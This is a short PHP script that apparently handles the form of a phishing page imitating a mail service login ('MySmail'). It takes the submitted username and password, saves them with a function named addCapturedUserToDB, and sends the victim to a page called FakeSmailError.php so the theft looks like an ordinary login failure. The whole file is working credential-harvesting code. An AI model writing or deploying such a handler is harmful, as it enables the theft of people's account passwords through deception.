<?php

require_once("basicmysql.php");

session_start();

$login = (string)$_POST['username'];
$pass = (string)$_POST['password'];

addCapturedUserToDB($login, $pass);

header("location: https://" . $_SERVER['HTTP_HOST'] ."/Krypto/MySmail/FakeSmailError.php");

?>